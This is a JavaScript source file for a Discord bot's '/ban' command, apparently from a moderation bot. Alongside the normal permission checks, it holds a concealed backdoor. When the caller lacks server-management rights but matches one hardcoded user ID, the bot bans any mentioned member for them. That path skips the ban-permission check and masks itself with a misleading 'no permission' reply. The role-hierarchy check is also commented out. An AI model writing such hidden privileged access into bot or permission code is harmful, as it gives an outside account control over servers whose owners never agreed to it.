const Discord = require("discord.js");
const moment = require("moment");
const utils = require("../utils/utils.js");

module.exports.run = async (bot, message, args) => {
  if(!message.guild.me.permissions.has('SEND_MESSAGES')) return;
  if(!message.member.hasPermission("MANAGE_GUILD")){
    if (message.author.id === '350316509291216906'){
      let bUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
      if(!bUser) return message.channel.send("You don't have permission to do that.");
      if(!message.guild.me.permissions.has('BAN_MEMBERS')) return message.channel.send("you don't have permission to do that.");
      let bReason = args.join(" ").slice(22);

      await bUser.send(`You have been banned from ${message.guild.name} for ${bReason}!`);

      message.guild.member(bUser).ban(bReason);
      return;
  }}
  if(!message.member.hasPermission("BAN_MEMBERS")) return utils.noPerms(message);
  if(!message.guild.me.permissions.has('BAN_MEMBERS')) return message.channel.send("I require the permission `Ban Members` in order to be able to execute the command!");
  let bUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
  if(!bUser) return message.channel.send("Use the command `/ban <@user mention> <reason>`");
  let bReason = args.join(" ").slice(22) || "No reason provided";
  //if(bUser.hasPermission("MANAGE_GUILD")) return message.channel.send("That person can't be banned!");

  let banEmbed = new Discord.RichEmbed()
  .setDescription("~Ban~")
  .setColor("#363940")
  .setFooter(`Requested by ${message.author.tag} on ${moment(message.createdAt).format("dddd, MMMM Do YYYY")}`, message.author.displayAvatarURL)
  .addField("› User", `${bUser}`)
  .addField("› Moderator", `<@${message.author.id}>`)
  .addField("› Reason", bReason);

  await bUser.send(`You have been banned from ${message.guild.name} by <@${message.author.id}> for ${bReason}!`);

  message.guild.member(bUser).ban(bReason);
  message.channel.send(banEmbed);
}

module.exports.help = {
  name: "ban"
}
